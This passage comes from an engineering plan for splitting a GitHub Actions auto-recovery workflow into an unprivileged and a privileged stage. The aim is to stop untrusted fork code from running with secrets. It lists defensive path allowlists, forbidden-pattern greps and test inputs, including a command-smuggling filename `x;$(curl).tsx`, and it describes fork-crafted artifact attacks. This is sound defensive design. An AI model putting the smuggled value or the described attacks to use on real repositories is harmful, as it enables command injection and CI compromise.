- **Open the follow-up PR as a DRAFT with no auto-merge trigger (security P2-2):** the repo has merge-queue/auto-merge; the follow-up PR must carry no auto-merge label and be CODEOWNERS/human-gated so a poisoned PR can't ride existing automation. Title `fix(constraint-gates): auto-recover tripped gate for #<pr>`, body `Ref #<pr>` + the gate-fix summary. **Do NOT brand it "pre-verified green" (security P0-3)** — Stage B never ran the gate; assert only what Stage B can attest (it applied an allowlisted, byte-verified, same-repo artifact). **Sanitize every Stage B output string** (PR body, comments, `::error::` annotations) — they carry attacker-controlled paths/`head_ref` (security P1-1; `cq-regex-unicode-separators-escape-only`): strip `[\x00-\x1f\x7f\x85  ]` as escape sequences, not literal chars. **Feedback-output preservation (CTO §6 P1):** one deterministic comment per terminal state (recovered→PR-opened / rejected-out-of-scope / fork-rejected / identity-mismatch / no-fix), never silent; explicit step-output conditionals, not job-`result` trichotomy.

### Phase 3 — Scaffold template + generator + tests
- Replace the held single `fix-constraints-workflow.template` with **two** templates (`fix-constraints-stage-a.template`, `fix-constraints-stage-b.template`) using the `__TARGET_DIR__` placeholder. Update `constraint-scaffold.sh` (emit both, extend the refuse-if-exists loop, sed both) — main version currently emits 3 artifacts; the held branch added FIXWORKFLOW (lines 40,156). The redesign emits config + runner + constraint-gates.yml + **both** stage workflows.
- Redesign `emit-fix-constraints.test.sh`: assert both stage files emitted, `__TARGET_DIR__` fully substituted (no residual placeholder), refuse-if-exists (exit 66), trigger-block anchored greps (`pull_request` in A, `workflow_run` in B — anchored on syntactic constructs, not prose, per the `pull-request-target`-in-comment false-match learning), a **forbidden-pattern** grep proving Stage B contains no `bun install` / no `actions/checkout` of head / no `git apply` / no PR-script execution, and — **load-bearing (architecture-strategist P1)** — a **name-coupling assertion**: Stage A's `^name:` MUST equal the string in Stage B's `on: workflow_run: workflows: [...]` (the `workflows:` filter matches the workflow's `name:` field, NOT its filename — a mismatch makes Stage B silently never trigger, no error). Keep `parity.test.sh` green (templates ↔ dogfood copies in sync).

### Phase 4 — Wording sweep + ADR + C4
- Flip recovery wording: `plugins/soleur/skills/constraint-scaffold/SKILL.md` (§Agent-owns-gates #4-5), `apps/web-platform/scripts/constraint-gates.sh` inline `::error::` recovery annotations (5 sites), `constraint-gates-workflow.template` + `shared-runner.template` + `depcruise-config.template` recovery wording, all from "comment `/soleur fix constraints` (PLANNED #5791, not yet wired)" → "auto-recovery follow-up PR (wired, ADR-074)". Sweep BOTH layers (dogfood under `apps/web-platform/` + the source `.template` files) — the `.template` extension is the grep blind spot the held #5791 plan flagged.
- Author ADR-074; amend ADR-071 recovery paragraph; edit `model.c4` + `views.c4`; run the C4 tests.

### Phase 5 — Verify + supersede
- Run scaffold tests (`boundary.test.sh`, `generator.test.sh`, `parity.test.sh`, `emit-fix-constraints.test.sh`), `components.test.ts`, the C4 tests, and `tsc`/lint where touched. **Cannot** verify the new workflows via `workflow_dispatch` pre-merge (GitHub requires the workflow on the default branch first — learning 2026-04-21-workflow-dispatch-requires-default-branch); verification is post-merge.
- Post-merge: query CodeQL alerts for 0 `actions/untrusted-checkout-toctou`; close #5804 (`gh pr close 5804` with a comment pointing at #5814); re-run the multi-agent security review with the `untrusted-checkout-toctou` class named in the spawn prompt.

## Files to Create
- `.github/workflows/fix-constraints-stage-a.yml`
- `.github/workflows/fix-constraints-stage-b.yml`
- `plugins/soleur/skills/constraint-scaffold/references/fix-constraints-stage-a.template`
- `plugins/soleur/skills/constraint-scaffold/references/fix-constraints-stage-b.template`
- `knowledge-base/engineering/architecture/decisions/ADR-074-fix-constraints-two-stage-privileged-split.md`

## Files to Edit
- `plugins/soleur/skills/constraint-scaffold/scripts/constraint-scaffold.sh` — emit both stage workflows; extend refuse-if-exists; sed both templates.
- `plugins/soleur/skills/constraint-scaffold/test/emit-fix-constraints.test.sh` (carry from #5804 as a new file if not yet on main — it is **5804-only**, so effectively *create* it in redesigned form) — redesign assertions for two-stage.
- `plugins/soleur/skills/constraint-scaffold/SKILL.md` — §Agent-owns-gates recovery wording (#4-5).
- `apps/web-platform/scripts/constraint-gates.sh` — 5 inline `::error::` recovery annotations.
- `plugins/soleur/skills/constraint-scaffold/references/{constraint-gates-workflow,shared-runner,depcruise-config}.template` — recovery wording.
- `knowledge-base/engineering/architecture/decisions/ADR-071-l1-constraint-gates.md` — recovery paragraph → point at ADR-074.
- `knowledge-base/engineering/architecture/diagrams/model.c4` + `views.c4` — add the `contributor` `#external` actor + the trust-boundary edge (reconciled into the existing scaffold→webapp edge / under the `github` system, NOT a duplicate `platform.plugin` component) + view include.

## Open Code-Review Overlap

None. `gh issue list --label code-review --state open` (62 open) — no body/title match for `fix-constraints`, `constraint-scaffold`, or `constraint-gates`.

## Acceptance Criteria

### Pre-merge (PR)
- [ ] `fix-constraints-stage-a.yml` triggers on `pull_request` (not `issue_comment`/`pull_request_target`), declares `permissions: contents: read` only, and contains **no** `contents: write` / `pull-requests: write` anywhere. Verify: `grep -L 'pull_request_target\|issue_comment' .github/workflows/fix-constraints-stage-a.yml` and a grep that the only `permissions:` block is `contents: read`.
- [ ] `fix-constraints-stage-b.yml` triggers on `workflow_run` (workflows: fix-constraints-stage-a, types: completed), guards `conclusion == 'success'`, and contains **no** `bun install`, no `setup-bun`, **no `actions/checkout` of the untrusted head**, no `git apply`, and no execution of any path from any tree. Verify: `grep -c 'bun install\|setup-bun\|git apply' fix-constraints-stage-b.yml` == 0 and no `actions/checkout` step references `head_sha`/PR head.
- [ ] Stage B sources `head_sha` from `github.event.workflow_run.head_sha` (NOT `meta.json`), resolves `pr_number`/`head_ref` from the event by API, and rejects on `meta.json` mismatch. Covered by a test feeding a mismatched `meta.json` and asserting rejection.
- [ ] Stage B builds the bot-branch commit via the **Git Data API** (blob→tree→commit→ref on parent `head_sha`), never a local checkout+apply.
- [ ] **Stage B explicit same-repo gate (security P0-1):** Stage B resolves the PR from `head_sha`, requires `isCrossRepository == false` AND exactly one matching open PR before any write; fork/0/≥2 → comment + no-op. Covered by a test asserting a fork-crafted artifact (attacker-rewritten Stage A) produces NO follow-up PR.
- [ ] Stage B path validator hard-rejects: `.github/**`, `**/*.cjs`, `constraint-gates.sh`, **the baseline JSON**, absolute/`..`-traversal paths, any char outside `[A-Za-z0-9._/-]` or control chars, and symlink(`120000`)/gitlink(`160000`) modes; ALLOWs only `apps/web-platform/{app,components,server}/**`, fail-closed (any unmatched path rejects the whole artifact); enforces file-count/size/total-size bounds. Covered by a shell test feeding (a) out-of-scope, (b) traversal, (c) symlink, (d) shell-metachar filename, (e) baseline-mutation, (f) oversized, (g) in-scope inputs.
- [ ] **Fix-only baseline-prohibition (data-integrity P0):** the baseline JSON is in NEITHER the Stage A artifact allowlist NOR the Stage B path allowlist; a baseline-mutating recovery aborts at Stage A. `touches_baseline` is derived server-side (never read from `meta.json`) and is telemetry-only. Covered by a test asserting baseline-mutation → no artifact / no follow-up PR.
- [ ] **Git Data API integrity:** Stage B creates blobs `base64` of raw bytes, verifies each against the per-file `sha256` in `meta.json` (fail-closed on mismatch), builds the tree with **mandatory `base_tree`** at `head_sha`, pins mode `100644`. Tests: (a) the bot commit's tree differs from `head_sha` ONLY in allowlisted paths (no deletions — `base_tree` present); (b) a tampered blob (sha mismatch) fails closed.
- [ ] **No false provenance / no auto-merge (security P0-3, P2-2):** the follow-up PR is opened as a draft, carries no auto-merge-triggering label, and its body does NOT claim "pre-verified green" (asserts only that Stage B applied an allowlisted, byte-verified, same-repo artifact). All Stage B output strings are sanitized (escape-sequence strip incl. `\x85  `).
- [ ] **Name-coupling (architecture-strategist P1):** Stage A's `name:` equals Stage B's `on: workflow_run: workflows: [...]` string (asserted by `emit-fix-constraints.test.sh`/`parity.test.sh`).
- [ ] **Feedback-output preservation:** every terminal state (recovered / rejected-out-of-scope / fork-rejected / identity-mismatch / integrity-fail / no-fix) posts exactly one deterministic comment on the original PR; none is silent.
- [ ] `emit-fix-constraints.test.sh` asserts both stage templates emit, `__TARGET_DIR__` fully substituted, refuse-if-exists (exit 66), and Stage B template contains no `bun install`. `parity.test.sh` green.
- [ ] `boundary.test.sh`, `generator.test.sh`, `components.test.ts`, and the C4 tests (`c4-code-syntax.test.ts`, `c4-render.test.ts`) pass.
- [ ] ADR-074 exists (status accepted) with the Alternatives table + the trigger-split-as-primary-decision framing; ADR-071 has BOTH edits (recovery paragraph → ADR-074; promote-to-required blocker drops the satisfied #5791 half, keeps #5778). `model.c4` adds the `contributor` actor + trust-boundary edge (C4 render test green; no duplicate scaffold→webapp edge).
- [ ] Recovery-wording sweep: `grep -rn 'PLANNED (#5791)\|not yet wired' apps/web-platform/scripts/constraint-gates.sh plugins/soleur/skills/constraint-scaffold/` returns 0 (excluding archived/planning artifacts).
- [ ] PR body uses `Ref #5814` (not `Closes`) — the actual close happens post-merge after CodeQL re-verification (ops-remediation class). *(Re-evaluate at /work: #5814 is a build, not an ops-apply; if no post-merge apply is needed, `Closes #5814` is fine. Default to `Closes #5814` unless the CodeQL re-verify is gated post-merge.)*

### Post-merge (automated)
- [ ] CodeQL `actions/untrusted-checkout-toctou` open-alert count for the redesigned workflows == 0: `gh api repos/{owner}/{repo}/code-scanning/alerts?state=open --jq '[.[]|select(.rule.id=="actions/untrusted-checkout-toctou")]|length'` → 0 (requires CodeQL `actions` scanning enabled per Phase 0.2).
- [ ] #5804 closed (not merged) with a comment pointing at #5814. `gh pr view 5804 --json state` → CLOSED, mergedAt null.
- [ ] Multi-agent security review re-run with the `untrusted-checkout-toctou` / privileged-trigger-untrusted-execution class explicitly in the spawn prompt; finding count for that class == 0.
- [ ] Capped per-tenant Anthropic key: spend cap confirmed set (Admin API / Console) for the dogfood key; tenant template provisions/prompts for it. *(Automation-status resolved per Phase 0.5; if a Playwright attempt reached a named human gate, operator-handoff is documented with evidence.)*

## Domain Review

**Domains relevant:** Engineering (primary), Operations (capped-key provisioning), Finance (bounded API spend). Product: NONE.

### Engineering (CTO / security)
**Status:** reviewed (in-pass + `soleur:engineering:cto` at plan + `security-sentinel` + `architecture-strategist` + `data-integrity-guardian` at deepen-plan)
**Assessment:** All four approve the direction (net security improvement over #5804). Findings folded:
- **CTO (3 P0):** event-sourced routing identity; Git Data API data-plane (no checkout/no apply); baseline-suppression hazard. + P1s: loop guard, per-head-SHA dedup, feedback-output preservation, full-`constraint-gates.sh` re-verify.
- **security-sentinel (3 P0 — corrected a load-bearing plan error):** `pull_request` runs the **fork's own Stage A definition**, so the artifact (contents AND `meta.json`) is **100% attacker-controlled** — the prior "fork → no key → no artifact" reasoning was WRONG. Fixes folded: (P0-1) Stage B explicit `isCrossRepository==false` + single-matching-PR gate; (P0-2) derive `touches_baseline` server-side, never trust `meta.json`; (P0-3) no false "pre-verified green" banner. + P1: sanitize Stage B output strings (escape-seq); positive-charset path allowlist + argv/env-not-shell; artifact resource bounds. + P2: draft/no-auto-merge follow-up PR; `--ignore-scripts` framed accurately (does not stop PR-head `.cjs` execution — accepted Stage-A residual). Confirmed: Git Data API genuinely makes the checkout sink structurally absent; "0 CodeQL alerts" ≠ artifact-data-trust safety.
- **data-integrity-guardian (1 P0):** make auto-recovery **fix-only** — baseline JSON removed from BOTH allowlists (supersedes the CTO-P0-3 "segregate" mitigation; a label is a no-op for a non-technical founder, and baseline-growth is the agent's path of least resistance). + P1: mandatory `base_tree` (else whole-repo deletion); byte-round-trip integrity via per-file sha256 + base64 blobs + mode-pin (reject 100755/120000/160000). + P2: Stage B `concurrency` keyed on `pr_number`; artifact↔meta consistency.
- **architecture-strategist (3 P1):** name-coupling (`workflows:` matches `name:` not filename → silent-never-trigger; test it); C4 re-scope (add `contributor` actor, reconcile the boundary into the existing scaffold→webapp edge, NOT a duplicate `platform.plugin` component); ADR-071 must also drop the satisfied #5791 promote-blocker half. + P1-adv: add `workflow_dispatch` to read-only Stage A for manual retry. Confirmed: supersede-#5804 sequencing correct; two-file split correct.

At single-user-incident threshold, review-time `user-impact-reviewer` + `security-sentinel` re-run with the `untrusted-checkout-toctou` / fork-runs-own-`pull_request`-definition class named in the spawn prompt.

### Operations
**Status:** reviewed (in-pass)
**Assessment:** The capped/rotatable Anthropic key is an ops-provisioning surface. Route via Admin-API/Playwright (UNVERIFIED until attempt), not an a-priori operator handoff.

### Finance
**Status:** reviewed (in-pass)
**Assessment:** The hard spend cap on the per-tenant key is the cost-blast-radius bound (bounded-exfil acceptance). No recurring vendor expense introduced beyond the existing Anthropic spend.

### Product/UX Gate
Not run — Product is NONE. Mechanical UI-surface scan of Files to Create/Edit (`.yml`, `.template`, `.sh`, `.md`, `.c4`) matches no UI-surface glob (`components/**/*.tsx`, `app/**/page.tsx`, `app/**/layout.tsx`). No `.pen` wireframe required (`wg-ui-feature-requires-pen-wireframe` N/A — no UI surface).
**Pencil available:** N/A (no UI surface)

## GDPR / Compliance Gate
Considered, skipped: no schemas, migrations, auth flows, `.sql`, or API routes. The agent's LLM processing of repo code via Anthropic is **pre-existing** (not new processing under the existing Anthropic DPA), uses no operator-session learnings, and adds no regulated-data surface. None of triggers (a)-(d) fire (the capped-key change is cost containment, not a new data-movement surface).

## Test Scenarios
- **Same-repo PR, gate red, auto-fixable:** Stage A fixes + verifies green + uploads full-contents artifact; Stage B same-repo gate passes, validates, builds commit via Git Data API, opens draft follow-up PR; original PR gets the link comment.
- **Same-repo PR, gate red, NOT auto-fixable:** agent makes no/insufficient edit; gate still red → no artifact → Stage B no-op; Stage A logs give-up.
- **Fork PR (attacker-rewritten Stage A uploads a hand-crafted artifact):** Stage B resolves the PR from `head_sha`, `isCrossRepository == true` → comment + no-op, NO follow-up PR. (The load-bearing fork-safety test — asserts the explicit gate, NOT the false "agent skipped" mechanism.)
- **Malicious artifact paths (`.github/workflows/**`, `..` traversal, symlink/gitlink mode, shell-metachar filename, baseline JSON):** Stage B path validator rejects pre-write, comments, no commit. (Security regression test — out-of-scope / traversal / symlink / `x;$(curl).tsx` / baseline-mutation inputs.)
- **Oversized / zip-bomb artifact:** Stage B rejects on file-count/size bounds before the blob loop.
- **Tampered blob (sha256 mismatch) / `base_tree`-omission deletion:** Stage B fails closed on hash mismatch; a test asserts the bot commit's tree differs from `head_sha` ONLY in allowlisted paths (no spurious deletions).
- **Fork-controlled `meta.json` redirects at a victim PR / flips `touches_baseline`:** Stage B uses event-sourced identity + derives `touches_baseline` server-side — `meta.json` fields never route or gate. (Identity-mismatch test.)
- **head moved after Stage A (TOCTOU):** Stage B builds on the event's immutable `head_sha` via Git Data API — never a surprise tree; no mutable ref resolved.
- **Scaffold emit + name-coupling:** both stage templates emitted with substituted `__TARGET_DIR__`; refuse-if-exists on re-run; Stage A `name:` == Stage B `workflows:` string.

## Alternative Approaches Considered
| Approach | Verdict |
|---|---|
| Single-job `issue_comment` with job-level `permissions: {}` on the agent job | **Rejected.** CodeQL keys on the *trigger* being privileged (issue_comment carries secrets + grants write), not job-perm downscoping. Untrusted-checkout-in-privileged-trigger stays red. |
| SHA-pin + `--ignore-scripts` + base-branch gate (targeted hardening) | **Rejected** (per issue). Closes TOCTOU + postinstall but leaves untrusted-code-with-secrets execution → CodeQL stays red. (We still adopt SHA-pin + `--ignore-scripts` as defense-in-depth.) |
| Egress-restricted self-hosted runner for Stage A | **Deferred** (Soleur-only, heavy). The capped key is the v1 containment. → tracking issue. |
| Comment→label→`pull_request:[labeled]` hybrid (preserves on-demand `/soleur fix constraints`) | **Deferred.** Preserves the #5791 comment UX with a CodeQL-clean labeling workflow (no checkout/exec), but adds a 3rd workflow. v1 ships zero-touch auto-recovery. → tracking issue. |
| Checkout head + `git apply` a diff in Stage B | **Rejected as primary.** Hostile diff-parser surface (rename/symlink/`..`), and checkout-in-privileged-`workflow_run` may trip `untrusted-checkout-high` independent of execution. The Git Data API (full post-image contents, no checkout) is the chosen primary — sink structurally absent. |
| Keep auto-recovery able to grow the baseline (segregate + heightened review) | **Rejected** (data-integrity P0). A label is a no-op for a non-technical founder; baseline-growth is the agent's path of least resistance → routine security-regression PRs. Auto-recovery is **fix-only**; baseline growth stays a maintainer-only local action. |

**Deferrals → tracking issues (create with re-eval criteria + milestone from roadmap.md):** egress-restricted runner; comment→label hybrid; (if Anthropic Admin-API mint proves un-automatable) the capped-key rotation runbook.

## Risks & Mitigations
- **Precedent-diff (deepen Phase 4.4):** `workflow_run` + `conclusion=='success'` guard has in-repo precedent — `deploy-docs.yml:16-18,32`, `post-merge-monitor.yml:18-21,48-51`. Cross-workflow `download-artifact` (`run-id: workflow_run.id`) has **no in-repo precedent** — establish per the v4 docs (Phase 0.4). The **Git Data API commit-creation** (blob→tree→commit→ref, no checkout) has **no in-repo precedent** — *novel pattern, scrutinize at review*. Scheduled-work/Inngest (ADR-033) is **N/A** — `workflow_run` is event-driven, not a cron.
- **`pull_request` runs the fork's OWN Stage A definition → the artifact is 100% attacker-controlled (security P0).** Mitigation: Stage B's explicit `isCrossRepository==false` + single-matching-PR gate, plus treating every artifact as untrusted (event-sourced identity, charset+size+symlink path allowlist, sha256 byte-verify). "No key on forks" protects spend/agent-execution only, NOT artifact integrity.
- **Baseline-suppression (data-integrity P0):** resolved by design — auto-recovery is **fix-only**; baseline JSON is out of both allowlists, so a baseline-mutating recovery aborts at Stage A → no PR. Not a residual risk.
- **`base_tree`-omission whole-repo deletion / byte-round-trip drift (data-integrity P1):** Mitigation: mandatory `base_tree`; base64 blobs + per-file sha256 verify; tree-diff test (only allowlisted paths change). Without these, the "Stage A verified green" claim wouldn't hold for the committed tree.
- **CodeQL via Git Data API:** no checkout step exists to flag; the post-merge 0-alerts AC is the proof. **But 0 alerts ≠ artifact-data-trust safety** — the explicit fork/identity/allowlist gates close that, not CodeQL.
- **CodeQL `actions` scanning not enabled** (advanced setup removed in 77c2376). Mitigation: Phase 0.2/0.7 verifies/enables (resolve automatability so it's not a late manual gate); else the 0-alerts AC is dashboard-verified with a note.
- **Auto-recovery noise / distinct-SHA key-burn** (agent fires on each red-gate PR; concurrency collapses same-SHA only). Mitigation: gate rarely trips; agent runs only when red; bot-branch loop guard; the **spend cap (not concurrency)** bounds a multi-SHA push-storm. Trade-off + vector noted in ADR-074.
- **Accepted residual:** `ANTHROPIC_API_KEY` runs over untrusted code in Stage A (and `--ignore-scripts` does NOT stop PR-head `.dependency-cruiser.cjs` execution). Mitigation: capped/rotatable per-tenant key with hard spend cap bounds exfil to spend.
- **Follow-up PR (GITHUB_TOKEN) triggers no CI.** Mitigation: Stage A pre-verified + Stage B byte-verified; the PR is a delivery vehicle, opened as draft/no-auto-merge with no false "pre-verified" provenance claim. Documented in ADR-074.

## Sharp Edges
- A plan whose `## User-Brand Impact` section is empty, contains only `TBD`/`TODO`/placeholder, or omits the threshold will fail `deepen-plan` Phase 4.6. (This plan's is filled; threshold = single-user incident.)
- **Do NOT name a `download-artifact` SHA from memory** — pin from `gh api repos/actions/download-artifact/git/refs/tags/v4` at /work. The repo has no existing precedent to copy.
- **claude-code-action `claude_args` ≠ the `claude` CLI flags** — reuse the held CI-validated string verbatim; do not re-derive flags.
- **`pull-request-target` in a workflow *comment* false-matches a forbidden-literal grep** — anchor trigger-presence greps on syntactic constructs (`^on:`-block keys), and write any explanatory prose with the hyphenated `pull-request-target` form (#5804 learning).
- **`pull_request` runs the FORK'S OWN workflow definition** (unlike `pull_request_target` which runs the base's) — a fork can rewrite Stage A to skip the agent and upload any artifact while keeping `name:` to fire Stage B. NEVER reason "fork → no key → safe artifact"; the agent is irrelevant to the attacker. The load-bearing fork defense is Stage B's explicit `isCrossRepository==false` gate.
- **`workflow_run: workflows: [X]` matches Stage A's `name:` field, NOT its filename** — a mismatch makes Stage B silently never trigger (no error). Pin `name:` == the array string and assert it in a test.
- **Stage B must never `actions/checkout` the untrusted head or `git apply`** — build via the Git Data API. The forbidden-pattern test guards `bun install`/`setup-bun`/`git apply`/`checkout-of-head`.
- **`base_tree` is MANDATORY on the tree create** — omit it and the bot branch deletes every other repo file. Blobs are `base64` raw bytes + sha256-verified; pin mode `100644`, reject `100755/120000/160000`.
- **Routing identity + `touches_baseline` from the event/server, never the artifact** — `meta.json` is an attacker-controlled cross-check only.
- **Auto-recovery is fix-only** — the baseline JSON is out of both allowlists; baseline growth is a maintainer-only local `constraint-scaffold --refresh-baseline`.
- **Sanitize BOTH stages' output strings as escape sequences** (`\x00-\x1f\x7f\x85  `), never literal chars (`cq-regex-unicode-separators-escape-only`).
- **Follow-up PR is draft + no-auto-merge + no false "pre-verified" provenance** — GITHUB_TOKEN PRs trigger no CI (by design); don't gate on a CI re-run that never fires, and don't claim Stage B verified what it didn't run.
- **Path allowlist fails closed:** any unmatched / traversal / symlink / shell-metachar / oversized input rejects the whole artifact, never partial.
